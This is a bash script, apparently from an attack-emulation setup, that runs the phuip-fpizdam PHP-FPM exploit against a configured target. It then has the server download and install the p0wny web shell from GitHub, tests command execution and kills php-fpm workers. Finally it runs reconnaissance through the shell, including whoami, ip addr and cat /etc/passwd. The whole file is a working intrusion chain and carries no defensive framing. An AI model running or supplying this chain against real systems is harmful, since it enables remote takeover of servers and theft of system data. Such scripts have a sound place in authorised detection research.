#!/bin/bash

echo "Loading configs/$1"
source configs/$1

SHELL_COMMAND="curl https://${TARGET_CLOUD_DOMAIN}/${WEBSHELL_NAME}?feature=shell"

echo "Executing fpizdam exploit ..."

/root/go/bin/phuip-fpizdam https://${TARGET_CLOUD_DOMAIN}/status.php

echo "done."

attack_wait $(shuf -i 0-20 -n 1)s

echo "Uploading the stable webshell ..."

# the stable web shell needs a few tries to succeed
# so we loop until we succeed and can run the id command with it
while true; do
  shell_upload=$(curl "https://${TARGET_CLOUD_DOMAIN}/status.php?a=wget%20--hsts-file+/dev/null+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php+-O+${WEBSHELL_NAME}")
  if [[ $shell_upload == *'installed":true,"maintenance'* ]]; then
    echo $shell_upload
    test_cmd=$($SHELL_COMMAND -d "cwd=.&cmd=id" 2> /dev/null)
    echo "Result of test command: $test_cmd"
    echo $test_cmd | grep '{"stdout":"'
    if [[ $? == 0 ]]; then
      echo "Deployed stable shell ..."
      break
    fi
  fi
  echo "Failed shell upload .. trying again"
  attack_wait 1s
done

# reset workers
while true; do
  reset_cmd=$($SHELL_COMMAND -d "cwd=.&cmd=pkill+php-fpm" 2> /dev/null)
  if [[ $reset_cmd == *'502 Bad Gateway'* ]]; then
    echo "Reset php-fpm workers ..."
    echo "Clearing /tmp/a ..."
    $SHELL_COMMAND -d "cwd=.&cmd=rm+/tmp/a"
    break
  fi
done

echo "done."

echo "Executing web shell discovery commands ..."

echo ""
attack_wait $(shuf -i 0-20 -n 1)s

$SHELL_COMMAND -d "cwd=.&cmd=whoami"
echo ""

attack_wait $(shuf -i 0-20 -n 1)s

$SHELL_COMMAND -d "cwd=.&cmd=ip addr"
echo ""

attack_wait $(shuf -i 0-20 -n 1)s

$SHELL_COMMAND -d "cwd=.&cmd=cat /etc/passwd"
echo ""

